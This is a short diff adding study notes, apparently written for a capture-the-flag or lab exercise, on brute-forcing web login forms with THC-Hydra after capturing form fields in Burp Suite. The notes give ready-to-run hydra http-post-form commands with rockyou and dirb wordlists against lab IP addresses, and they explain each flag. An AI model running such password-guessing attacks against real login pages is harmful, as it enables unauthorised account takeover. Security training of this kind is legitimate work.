@@ -1,0 +1,56 @@
+
+Crack Online Web Form Passwords with THC-Hydra & Burp Suite:
+----------------------------------------------------------------------------
+
+1. Open THC-Hydra
+
+2. Get the Web Form Parameters through BURPSUIT.
+    
+         > IP Address of the website         : 10.10.178.180
+         > URL                               :/admin/login.php or, /admin etc...
+         > type of form                      : post http  -------- http-post-form
+         > field containing the username     : username / user etc parameter
+         > field containing the password     : password / pass /passwd etc parameter
+         > failure message                   : Login failed / Username or password invalid etc
+         
+         we have to get these info through burpsuit.
+         
+ 3. Then comes the command:
+ 
+ >  [ hydra -L <wordlist> -P <password list> 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" ]
+   
+ >  [ hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/admin/:username=^USER^&password=^PASS^&Login=Login:Login failed" -V }
+   
+  >>> If there is no Login parameter:
+   
+ >  [ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.68.109 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -V ]
+
+   
+   
+   
+   
+   FLAG:
+   ________________________________________________________________
+      -l indicates a single username 
+      -L for a username list
+      -P indicates use the following password list
+      http-post-form indicates the type of form
+      /dvwa/login-php is the login page URL
+      username is the form field where the username is entered
+      ^USER^ tells Hydra to use the username or list in the field
+      password is the form field where the password is entered (it may be passwd, pass, etc.)
+      ^PASS^ tells Hydra to use the password list supplied
+      Login indicates to Hydra the login failed message
+      Login failed is the login failure message that the form returned
+      -V is for verbose output showing every attempt
+
+
+
+
+
+
+
+
+__________________________________________________________________________________________________________________________________________________________
+Source: https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/
+__________________________________________________________________________________________________________________________________________________________
